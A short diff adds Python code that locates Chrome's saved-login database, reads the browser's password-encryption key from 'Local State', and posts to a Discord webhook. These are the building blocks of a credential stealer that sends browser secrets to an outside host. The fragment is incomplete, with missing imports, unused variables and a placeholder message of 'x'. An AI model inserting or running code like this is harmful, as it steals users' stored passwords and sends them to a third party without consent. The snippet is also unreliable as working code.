@@ -1,0 +1,6 @@
+import requests
+WH = "https://discord.com/api/webhooks/123456789012345678/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+p = os.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Login Data"
+k = json.load(open("Local State"))["os_crypt"]
+requests.post(WH, json={"content": "x"})
+
